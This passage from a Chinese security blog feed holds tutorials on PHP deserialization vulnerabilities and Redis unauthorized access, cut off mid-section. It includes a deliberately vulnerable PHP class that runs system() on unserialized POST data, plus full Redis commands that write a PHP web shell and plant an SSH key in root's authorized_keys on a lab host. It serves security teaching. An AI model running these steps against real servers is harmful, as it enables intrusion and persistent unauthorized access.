class="line">    <span class="keyword">protected</span> <span class="variable">$age</span> = <span class="number">18</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$sex</span> =“男<span class="string">&quot;;</span></span><br><span class="line"><span class="string">    public function userinfo( )&#123;</span></span><br><span class="line"><span class="string">        echo“姓名: &quot;</span>. <span class="variable language_">$this</span>-&gt;name . <span class="string">&quot;年龄:&quot;</span> . <span class="variable language_">$this</span>-&gt;age . <span class="string">&quot;性别:&quot;</span> . <span class="variable language_">$this</span>-&gt;sex . <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$jack</span> = <span class="keyword">new</span> <span class="title class_">People</span>( );</span><br><span class="line"><span class="variable">$jack</span> -&gt; name = <span class="string">&quot;Jack&quot;</span>;</span><br><span class="line"><span class="variable">$jack</span> -&gt; <span class="title function_ invoke__">userinfo</span>( );  <span class="comment">// 姓名: Jack年龄:18性别:男</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$jack</span>);</span><br><span class="line"><span class="comment">// 0:6: &quot;&quot;People&quot;: 3:&#123;s: 4 : &quot;name&quot; ; s :4 : &quot;Jack&quot; ; s :6 : &quot;*age&quot; ; i:18;s:11: &quot;Peoplesex&quot; ; s :3:&quot;男&quot;;&#125;</span></span><br></pre></td></tr></table></figure><p>序列化的字符串为:</p><p><code>&#123;s:4:&quot;name&quot;;s:4:&quot;Jack&quot;;s:6:&quot;*age&quot;;i:18;s:11:&quot;Peoplesex&quot;;s:3:&quot;男&quot;;&#125;</code></p><p>这里看不到<code>\x00</code> ，实际上通过属性长度可以发现是存在的，只是没有显示出来，为了达到显示效果，这里得使用<code>Python</code>的<code>request</code>模块来发起请求拿到原始数据值:</p><p><img src="https://tva1.sinaimg.cn/large/008s52kYly1h5b9aqvngij315805aq4y.jpg" alt="image.png"></p><h3 id="unserialize-反序列化"><a href="#unserialize-反序列化" class="headerlink" title="unserialize 反序列化"></a>unserialize 反序列化</h3><p>将序列化后的字符串还原成一个对象，函数描述如下:</p><p><code>unserialize ( string $str ) : mixed</code></p><p>接下来把上面序列化的字符串:<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0</span>:<span class="number">6</span>: <span class="string">&quot;People&quot;</span> :<span class="number">2</span>:&#123;s:<span class="number">4</span> : <span class="string">&quot;name&quot;</span> ; s:<span class="number">4</span>: <span class="string">&quot;Jack&quot;</span> ;s :<span class="number">3</span> : <span class="string">&quot;age&quot;</span> ;i:<span class="number">18</span>;&#125;</span><br></pre></td></tr></table></figure><br>尝试反序列化同去然后测洲l讨反序列化后的功能是否可以正常使用:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">People</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$age</span> = <span class="number">18</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$sex</span> =<span class="string">&quot;男&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">userinfo</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;姓名: &quot;</span>. <span class="variable language_">$this</span>-&gt;name . <span class="string">&quot;年龄: &quot;</span>. <span class="variable language_">$this</span>-&gt;age . <span class="string">&quot;性别: &quot;</span> . <span class="variable language_">$this</span>-&gt;sex . <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$jack</span> = <span class="title function_ invoke__">unserialize</span>(<span class="string">&#x27;0:6:&quot;People&quot;:2:&#123;s:4:&quot;name&quot;;s:4:&quot;Jack&quot;;s:3:&quot;age&quot;;i:18;&#125;&#x27;</span>);</span><br><span class="line"><span class="variable">$jack</span> -&gt; <span class="title function_ invoke__">userinfo</span>(); <span class="comment">//姓名:Jack年龄:18 性别:男</span></span><br></pre></td></tr></table></figure><p>发现功能依旧是正常的</p><h3 id="PHP反序列化漏洞"><a href="#PHP反序列化漏洞" class="headerlink" title="PHP反序列化漏洞"></a>PHP反序列化漏洞</h3><p>用户可控传入的序列化数据，直接传递<code>unserialize</code> 函数，操作了类方法，常配合魔术方法来执行非预期的结果。</p><h4 id="实例代码"><a href="#实例代码" class="headerlink" title="实例代码"></a>实例代码</h4><p>魔术方法</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">header</span>( <span class="string">&quot; charset=utf-8&quot;</span><span class="string">&quot;);</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">class magic_test</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">    public <span class="subst">$data1</span> = &quot;</span>hello<span class="string">&quot;;</span></span><br><span class="line"><span class="string">    public <span class="subst">$data2</span> = &quot;</span>world<span class="string">&quot;;</span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">    public function print_data()</span></span><br><span class="line"><span class="string">    &#123;</span></span><br><span class="line"><span class="string">        echo <span class="subst">$this</span>-&gt;<span class="subst">$data1</span>. <span class="subst">$this</span>-&gt;<span class="subst">$data2</span>. &quot;</span>&lt;br&gt;<span class="string">&quot;;</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">    public function _construct()</span></span><br><span class="line"><span class="string">    &#123;</span></span><br><span class="line"><span class="string">    echo &quot;</span> <span class="title function_ invoke__">__construct</span>() &lt;br&gt;<span class="string">&quot;;</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">    public function _destruct()</span></span><br><span class="line"><span class="string">    &#123;</span></span><br><span class="line"><span class="string">    echo &quot;</span><span class="title function_ invoke__">_destruct</span>() &lt;br&gt;<span class="string">&quot;;</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">    public function __sleep()</span></span><br><span class="line"><span class="string">    &#123;</span></span><br><span class="line"><span class="string">        echo &quot;</span>_sleep &lt;br&gt;<span class="string">&quot;;</span></span><br><span class="line"><span class="string">        return array (&quot;</span>data1<span class="string">&quot;,&quot;</span>data2<span class="string">&quot;);</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">    public function __wakeup()</span></span><br><span class="line"><span class="string">    &#123;</span></span><br><span class="line"><span class="string">    echo &quot;</span><span class="title function_ invoke__">__wakeup</span>( ) &lt;br&gt;<span class="string">&quot;;</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"><span class="subst">$obj</span> = new magic_test();</span></span><br><span class="line"><span class="string"><span class="subst">$serialized</span> = serialize(<span class="subst">$obj</span>);</span></span><br><span class="line"><span class="string">echo <span class="subst">$serialized</span>. &quot;</span>&lt;br&gt;<span class="string">&quot;;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"><span class="subst">$obj2</span> = unserialize( <span class="subst">$serialized</span> );</span></span><br><span class="line"><span class="string"><span class="subst">$obj2</span>-&gt;print_data( );</span></span><br><span class="line"><span class="string">?&gt;</span></span><br></pre></td></tr></table></figure><p>运行结果：</p><p><img src="https://tva1.sinaimg.cn/large/008s52kYly1h5b9ofrqlrj30ln073gmg.jpg" alt="image.png"></p><p>常见的魔术方法的解释:</p><p><code>_construct</code> ，构造函数，PHP 5允行开发者在一个类中定义一个方法作为构造函数。具有构造函数的类会在每次创建新对象时先调用此方法，所以非常适合在使用对象之前做一些初始化工作。</p><p><code>_destruct</code> ，析构函数，PHP 5引入了析构函数的概念，这类似于其它面向对象的语言，如 C++ 。析构函数会在到某个对象的所有引用都被删除或者当对象被显式销毁时执行。</p><p><code>_sleep magic</code>方法在一个对象被序列化的时候调用。</p><p><code>_wakeup magic</code>方法在一个对象被反序列化的时候调用。</p><p><code>_toString</code> ,打印一个对象时，如果定义了 toString() 方法，就能在测试时，通过echo打印对象体，对象就会自动调用它所属类定义的toString方法，格式化输出这个对象所包含的数据。</p><ul><li>小试牛刀</li><li><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">vul</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$cmd</span> = <span class="string">&#x27;ls&#x27;</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">_wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">system</span>( <span class="variable">$this</span>-&gt;<span class="variable">$cmd</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">unserialize</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;data&#x27;</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></li></ul><p><img src="https://tva1.sinaimg.cn/large/008s52kYly1h5baex800lj30ba04z0tc.jpg" alt="image.png"></p><p>POSt一下 得到flag</p><p><img src="https://tva1.sinaimg.cn/large/008s52kYly1h5bahy3ftmj30lj0f9gqs.jpg" alt="image.png" style="zoom:80%;" /></p>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla</summary>
      
    
    
    
    <category term="网络安全" scheme="http://chalnl.com/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="网络安全" scheme="http://chalnl.com/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"/>
    
    <category term="序列化反序列化" scheme="http://chalnl.com/tags/%E5%BA%8F%E5%88%97%E5%8C%96%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    
  </entry>
  
  <entry>
    <title>未授权访问漏洞</title>
    <link href="http://chalnl.com/post/f519efa9.html/"/>
    <id>http://chalnl.com/post/f519efa9.html/</id>
    <published>2022-08-15T16:00:00.000Z</published>
    <updated>2022-08-19T07:00:46.715Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="未授权访问"><a href="#未授权访问" class="headerlink" title="未授权访问"></a>未授权访问</h2><p>未授权访问，顾名思义<strong>不进行请求授权的情况下对需要权限的功能进行访问执行</strong>。通常是由于<strong>认证页面存在缺陷</strong>，无认证，安全配置不当导致。<strong>常见于服务端口，接口无限制开放，网页功能通过链接无限制用户访问，低权限用户越权访问高权限功能</strong>越权漏洞。<br>未授权访问通常是会<strong>泄露用户信息，系统信息</strong>。某些服务和系统中，未授权访问还可以<strong>执行系统命令，操作系统文件，导致系统的整体安全遭到破坏</strong>。</p><ul><li><strong>常见未授权访问漏洞总结</strong>  <a href="http://xz.aliyun.com/t/6103">xz.aliyun.com/t/6103</a></li></ul><h3 id="Redis-未授权访问"><a href="#Redis-未授权访问" class="headerlink" title="Redis 未授权访问"></a>Redis 未授权访问</h3><p>Redis是一个开源的使用ANSIC语言编写、支持网络、可基于内存亦可持久化的<strong>日志型、Key-Value数据库</strong>，并提供多种语言的API。<br>Redi 因配置不当可以未授权访问。攻击者无需认证访问到内部数据，可<strong>导致敏感信息泄露</strong>，也可以恶意执行操作。</p><h4 id="Redis环境搭建"><a href="#Redis环境搭建" class="headerlink" title="Redis环境搭建"></a>Redis环境搭建</h4><ul><li>Windows安装 推荐linux装<br>下载地址: <a href="https://github.com/microsoftarchive/redis/releases">https://github.com/microsoftarchive/redis/releases</a></li></ul><p>打开一个cmd窗口使用命令切换到 Redis 运行:</p><p><code>redis-server.exe redis.windows.conf</code></p><p>后面的那个redis.windows.conf可以省略，如果省略，会启用默认的。输入之后，会显示如下界面:<br><img src="https://tva1.sinaimg.cn/large/008s52kYly1h553ksapn0j30qj0c9dkh.jpg" alt="image.png"></p><p>这时候另启一个CMD窗口，原来的不要关闭，不然就无法访问服务端了。</p><p><strong>一些基本的交互命令:</strong><br><strong>切换到Redis目录下运行:</strong></p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">redis-cli.exe -h127.0.0.1 -p 6379</span><br><span class="line"></span><br><span class="line"><span class="comment">#查看Redis的相关信息</span></span><br><span class="line">127.0.0.1:6379&gt;info</span><br><span class="line"></span><br><span class="line"><span class="comment">#SET 设置键值对测试</span></span><br><span class="line">127.0.0.1:6379&gt;SET X<span class="string">&quot;Tomorrow is a another day&quot;</span></span><br><span class="line">oK</span><br><span class="line"></span><br><span class="line">127.0.0.1:6379&gt; GET X</span><br><span class="line"><span class="string">&quot;Tomorrow is a another day&quot;</span></span><br></pre></td></tr></table></figure><ul><li><strong>Linux编译安装</strong><br>下载地址:<a href="https://redis.io/download">https://redis.io/download</a></li></ul><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#下载Redis</span></span><br><span class="line">wget http://download.redis.io/releases/redis-5.0.5.tar.gz</span><br><span class="line"></span><br><span class="line"><span class="comment">#解压</span></span><br><span class="line">tar zxvf redis-5.0.5..tar.gz</span><br><span class="line"></span><br><span class="line"><span class="comment">#到src目录下</span></span><br><span class="line"><span class="built_in">cd</span> redis-5.0.5/src</span><br><span class="line"></span><br><span class="line"><span class="comment">#编译</span></span><br><span class="line">make</span><br><span class="line"></span><br><span class="line"><span class="comment">#启动Redis服务:</span></span><br><span class="line"><span class="built_in">cd</span> src</span><br><span class="line">./src/redis-server redis.conf</span><br></pre></td></tr></table></figure><blockquote><p>注意这种方式启动Redis使用的是默认配置。也可以通过启动参数告诉Redis使用指定配置文件使用下面命令启动。./src/redis-server redis.conf其中 <strong>redis.conf 是一个默认的配置文件</strong>。我们可以<strong>根据需要使用自己的配置文件</strong>。</p></blockquote><p>启动Redis服务进程后，就可以<strong>使用测试客户端程序redis-cli和Redis服务交互了</strong>:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">root@kali-linux:~/ redis-5.0.5/src<span class="comment"># ./ redis-cli -h 127.0.0.1 -p 6379</span></span><br><span class="line">127.0.0. 1:6379&gt;SET y <span class="string">&quot;Linux Redis is Running&quot;</span></span><br><span class="line">0K</span><br><span class="line"></span><br><span class="line">127.0.0.1:6379&gt; GET y</span><br><span class="line"><span class="string">&quot;Linux Redis is Running&quot;</span></span><br></pre></td></tr></table></figure><p><img src="https://tva1.sinaimg.cn/large/008s52kYly1h5517wgupsj30q507o436.jpg" alt="image"></p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#操作目录</span></span><br><span class="line">10.211.55.4:6379&gt; config <span class="built_in">set</span> <span class="built_in">dir</span> /var/www/html/</span><br><span class="line">OK.</span><br><span class="line"></span><br><span class="line"><span class="comment">#操作文件</span></span><br><span class="line">10.211.55.4:6379&gt; config <span class="built_in">set</span> dbfilename shell.php</span><br><span class="line">OK</span><br><span class="line"></span><br><span class="line"><span class="comment">#设置数据</span></span><br><span class="line">10.211.55.4:6379&gt; <span class="built_in">set</span> x <span class="string">&quot;&lt;?php phpinfo( ) ; ?&gt;&quot;</span></span><br><span class="line">0K</span><br><span class="line"></span><br><span class="line"><span class="comment">#写入数据</span></span><br><span class="line">10.211.55.4:6379&gt;save</span><br><span class="line">OK</span><br></pre></td></tr></table></figure><ul><li><strong>Linux apt 安装</strong></li></ul><p>在 <strong>Ubuntu</strong> 系统安装 <strong>Redis</strong> 可以使用以下命令：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#更新源</span></span><br><span class="line">$ sudo apt-get update</span><br><span class="line"></span><br><span class="line"><span class="comment">#安装redis</span></span><br><span class="line">$ sudo apt-get install redis-server</span><br><span class="line"></span><br><span class="line"><span class="comment">#启动redis</span></span><br><span class="line">$ redis-server</span><br><span class="line"></span><br><span class="line"><span class="comment">#测试连接</span></span><br><span class="line">$ redis-cli</span><br></pre></td></tr></table></figure><h3 id="未授权访问修改公私钥"><a href="#未授权访问修改公私钥" class="headerlink" title="未授权访问修改公私钥"></a>未授权访问修改公私钥</h3><p>Redis 未授权访问在4.x/5.0.5以前版本下，我们可以使用 master/slave 模式加载远程模块，通过动态链接库的方式执行任意命令。</p><h4 id="安装配置SSH"><a href="#安装配置SSH" class="headerlink" title="安装配置SSH"></a>安装配置SSH</h4><p>首先受害者 Redis 的服务器配置好公司钥登录的情况下可以直接<strong>通过修改秘钥来直接登录到服务器</strong>:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#更新源</span></span><br><span class="line">apt update</span><br><span class="line"></span><br><span class="line"><span class="comment">#安装openssh-server</span></span><br><span class="line">apt install openssh-server</span><br><span class="line"></span><br><span class="line"><span class="comment">#允许root远程登陆</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;PermitRootLogin yes&quot;</span> &gt;&gt;/etc/ssh/sshd_config</span><br><span class="line"></span><br><span class="line"><span class="comment">#SSH开机自启</span></span><br><span class="line">systemctl <span class="built_in">enable</span> sshd</span><br><span class="line"></span><br><span class="line"><span class="comment">#开启SSH</span></span><br><span class="line">systemctl start sshd</span><br></pre></td></tr></table></figure><p>客户端尝试连接服务器尝试：</p><p><img src="https://tva1.sinaimg.cn/large/008s52kYly1h5a0p1guc8j30m607fwh2.jpg" alt="image.png"></p><h4 id="配置公私钥"><a href="#配置公私钥" class="headerlink" title="配置公私钥"></a>配置公私钥</h4><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#生成公私钥</span></span><br><span class="line">ssh-keygen</span><br><span class="line"></span><br><span class="line"><span class="comment">#到ssh公私钥放的文件夹</span></span><br><span class="line"><span class="built_in">cd</span> /root/.ssh/</span><br><span class="line"></span><br><span class="line"><span class="comment">#将公钥的内容拷贝到authorized_keys文件中</span></span><br><span class="line"><span class="built_in">cat</span> id_rsa.pub &gt;&gt; authorized_keys</span><br><span class="line"></span><br><span class="line"><span class="comment">#关闭密码登陆</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;PasswordAuthentication no&quot;</span> &gt;&gt; /etc/ssh/sshd_config</span><br><span class="line"></span><br><span class="line"><span class="comment">#重启ssh</span></span><br><span class="line">/etc/init.d/ssh restart</span><br></pre></td></tr></table></figure><p><img src="https://tva1.sinaimg.cn/large/008s52kYly1h5a0uaaebvj30gy08u43b.jpg" alt="image.png"></p><p>将id-rsa拷贝到自己的机器上，用于连接SSH使用。<br>现在连接的效果如下:</p><p><img src="https://tva1.sinaimg.cn/large/008s52kYly1h5a0voknidj30ma03uaau.jpg" alt="image.png"></p><p>客户端尝试公私钥登录:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#将拷贝下来的私钥设置600权限</span></span><br><span class="line"><span class="built_in">chmod</span> 600 ~/Downloads/ id_rsa</span><br><span class="line"></span><br><span class="line"><span class="comment">#使用私钥登陆</span></span><br><span class="line">ssh -i ~/Downloads /id_rsa root@10.211.55.4</span><br></pre></td></tr></table></figure><p><img src="https://tva1.sinaimg.cn/large/008s52kYly1h5a0xfeb5cj30ma07ntbb.jpg" alt="image.png"></p><h4 id="模拟真实攻击"><a href="#模拟真实攻击" class="headerlink" title="模拟真实攻击"></a>模拟真实攻击</h4><div class="table-container"><table><thead><tr><th>攻击者</th><th>IP地址</th></tr></thead><tbody><tr><td>macOS本机</td><td>10.211.55.2</td></tr><tr><td>Kali Linux虚拟机</td><td>10.211.55.4</td></tr></tbody></table></div><p>Kali Linux虚拟机配置下Redis配置文件关闭IP地址绑定：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">pwd</span></span><br><span class="line">/root/redis-5.0.5</span><br><span class="line">$ vim redis.conf</span><br></pre></td></tr></table></figure><p>去掉ip绑定，允许除本地外的主机远程登录redis服务，需要注释掉如下内容:</p><p><code>bind 127.0.0.1</code></p><p>关掉保护模式:</p><p><code>protected-mode no</code></p><p>然后重启下Redis服务︰</p><p><code>./src/redis-server redis.conf</code></p><p><img src="https://tva1.sinaimg.cn/large/008s52kYly1h5a11ttbh2j30l50awq6w.jpg" alt="image.png"></p><p>首先攻击者先本地生成一对公私钥：</p><p><img src="https://tva1.sinaimg.cn/large/008s52kYly1h5a13s09wkj30mc0hbwiv.jpg" alt="image.png"></p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#连接redis</span></span><br><span class="line">$ redis-cli -h 10.211.55.4 -p 6379</span><br><span class="line"></span><br><span class="line"><span class="comment">#查看当前路径</span></span><br><span class="line">10.211.55.4:6379&gt; config get <span class="built_in">dir</span></span><br><span class="line">1) <span class="string">&quot;dir&quot;</span></span><br><span class="line">2) <span class="string">&quot; / root/redis-5.0.5&quot;</span><span class="string">&quot;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">#查看当前要操作的文件</span></span><br><span class="line"><span class="string">10.211.55.4:6379&gt; config get dbfilename</span></span><br><span class="line"><span class="string">1) &quot;</span>dbfilename<span class="string">&quot;</span></span><br><span class="line"><span class="string">2 ) &quot;</span>dump.rdb<span class="string">&quot;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">#设置要操作的路径</span></span><br><span class="line"><span class="string">10.211.55.4:6379&gt;config set dir /root/.ssh/</span></span><br><span class="line"><span class="string">OK</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">#设置要操作的文件</span></span><br><span class="line"><span class="string">10.211.55.4:6379&gt; config set dbfilename authorized_keys</span></span><br><span class="line"><span class="string">OK</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">#查看设置好的路径</span></span><br><span class="line"><span class="string">10.211.55.4:6379&gt; config get dir</span></span><br><span class="line"><span class="string">1) &quot;</span><span class="built_in">dir</span><span class="string">&quot;</span></span><br><span class="line"><span class="string">2) &quot;</span>/root/.ssh<span class="string">&quot;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">#查案设置好的文件</span></span><br><span class="line"><span class="string">10.211.55.4:6379&gt; config get dbfilename</span></span><br><span class="line"><span class="string">1) &quot;</span>dbfilename<span class="string">&quot;</span></span><br><span class="line"><span class="string">2) &quot;</span>authorized_keys<span class="string">&quot;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">#写入公钥的值</span></span><br><span class="line"><span class="string">10.211.55.4:6379&gt; set x &quot;</span>\n\n\nssh-rsa 公钥</span><br><span class="line">OK</span><br><span class="line"></span><br><span class="line"><span class="comment">#将公钥的值保存到要操作的文件</span></span><br><span class="line">10.211.55.4:6379&gt;save</span><br><span class="line">0K</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="未授权访问弹-shell"><a href="#未授权访问弹-shell" class="headerlink" title="未授权访问弹 shell"></a>未授权访问弹 shell</h3><ul><li><strong>crontab 定时任务</strong><br>Python 实现T00ls自动签到脚本（邮件+钉钉通知)<br>Linux下使用原生的crontab命令实现定时任务了∶</li></ul><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#查看定时任务</span></span><br><span class="line">c</span><br><span class="line"></span><br><span class="line"><span class="comment">#编辑定时任务</span></span><br><span class="line">crontab -e</span><br></pre></td></tr></table></figure><p>编辑定时任务，一行一个任务:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#分时日月星期要运行的命令</span></span><br><span class="line">30 9 * * * /usr/bin/python3 /root/code/t00ls/TuBi.py&gt;&amp;1</span><br></pre></td></tr></table></figure><p>表示每天9:30自动运行下面的命令:</p><p><code>/usr/bin/python3 /root/ code/t00ls/TuBi.py</code></p><p>这样看起来是不是很简单呢，如果语法没有问题的话，会得到如下提示:</p><p><code>crontab: installing new crontab</code></p><p>这表示新建定时任务成功，后面就可以躺着赚去每天的2个TuBi了。</p><h3 id="crontab实例"><a href="#crontab实例" class="headerlink" title="crontab实例"></a>crontab实例</h3><ul><li><p><strong>实例1</strong>∶每1分钟执行一次myCommand</p><p><code>* * * * * myCommand</code></p></li><li><p><strong>实例2</strong>:每小时的第3和第15分钟执行</p><p><code>315 * * * * myCommand</code></p></li><li><p><strong>实例3</strong>:在上午8点到11点的第3和第15分钟执行</p><p><code>3,15 8-11 * * * 